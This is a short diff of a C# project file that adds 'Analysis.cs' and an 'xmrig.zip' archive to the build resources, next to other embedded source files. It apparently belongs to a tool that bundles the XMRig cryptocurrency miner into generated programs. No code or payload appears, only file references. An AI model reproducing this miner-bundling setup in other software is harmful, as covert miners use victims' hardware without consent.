@@ -60,6 +60,7 @@
     </Compile>
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <None Include="Resources\Analysis.cs" />
     <None Include="Resources\Resources.Designer.cs" />
     <None Include="Resources\RAM.cs" />
     <None Include="Resources\Program.cs" />
@@ -90,6 +91,7 @@
       <DependentUpon>Settings.settings</DependentUpon>
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
+    <None Include="Resources\xmrig.zip" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
